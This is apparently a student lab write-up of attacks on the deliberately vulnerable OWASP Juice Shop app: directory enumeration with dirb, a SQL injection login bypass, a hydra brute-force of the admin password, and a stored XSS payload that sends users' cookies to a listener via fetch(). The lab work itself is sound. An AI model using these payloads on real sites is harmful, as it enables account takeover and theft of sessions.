# juiceshop-cyber project 2024

first we install juice shop on a docker 
then run it in thebackground using
sudo docker run --rm -p 3000:3000 bkimminich/juice-shop

# Enumeration Testing

we use drib tool
dirb http://172.17.0.1:3000/# /usr/share/wordlists/dirb/common.txt -v | grep admin
it got the hidden paths that are hidden from a normal user
then we found a page called administration that can show all users on the webiste
![image](https://github.com/user-attachments/assets/93523f8d-6694-48c8-967d-1c1fcca74b79)

# Sql Injection
we are going to go the login page and try this sql command
admin’ OR 1=1 – “ it will work and we will access the site as an admin
![image](https://github.com/user-attachments/assets/d36a6ca5-9caa-456a-9f6f-dfd2ec0cedd5)

# Brute Forcing
we now logged in as an admin but we still dont know the password of the admin account there fore we are using
hydra as a tool
hydra -s 3000 -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt 172.17.0.1 http-post-form 
"/#/login:email=^USER^&password=^PASS^:F=Invalid email or password." -V -I -f -t 1 -w 1

which takes the admin email and the path of wordlists from the location and the ip which we will brute force and the fields we are going to brute force on which we got from whiteshark and attempts 1 task per 1 server and -w is the delay between each task which will be 1 second only
![image](https://github.com/user-attachments/assets/122628ba-a988-44f4-94d2-9254e1b573b6)


# Xss in product search

first we make a temporary server to store the cookie or tokens
python -m http.server 8080
we also injected this commmand in the product search bar so whenever a user searches something it takes his token and cookie
<iframe src="javascript:fetch('http://172.17.0.1:8080?cookie='+document.cookie)"></iframe>


we also injected a soundcloud sound to mess with the person
using this
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" 
src="https://w.soundcloud.com/player/?
 url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_relate
 d=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>

![image](https://github.com/user-attachments/assets/41c1c49b-6e8b-4106-9c17-836d4b216972)


